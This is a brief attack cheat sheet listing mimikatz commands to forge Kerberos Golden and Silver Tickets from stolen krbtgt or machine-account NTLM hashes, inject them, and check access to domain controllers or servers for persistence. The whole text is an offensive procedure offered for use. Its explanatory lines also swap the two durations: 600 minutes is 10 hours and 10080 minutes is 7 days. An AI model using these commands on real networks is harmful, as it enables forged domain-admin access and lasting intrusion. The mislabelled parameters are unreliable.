# GOLDEN TICKET PERSISTENCE

#### 1) Get-ADDomain 

#### 2) mimikatz

#### 3) kerberos::golden /admin:FAKE_ACCOUNT /domain:DOMAIN /id:500 /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM_HASH /endin:600 /renewmax:10080 /ptt

### /endin:600 = 7 days (Default 10 years)

### /renewmax:10080 = 10 hours (Default 10 years)

#### 4) Run dir against domain controller

# SILVER TICKET PERSISTENCE

#### 1) kerberos::golden /admin:FAKE_ACCOUNT /domain:DOMAIN /id:500 /sid:DOMAIN_SID /target:HOSTNAME_OF_TARGET_SERVER /rc4:MACHINE_ACCOUNT_NTLM_HASH /service:cifs /ptt

#### 2) dir against server
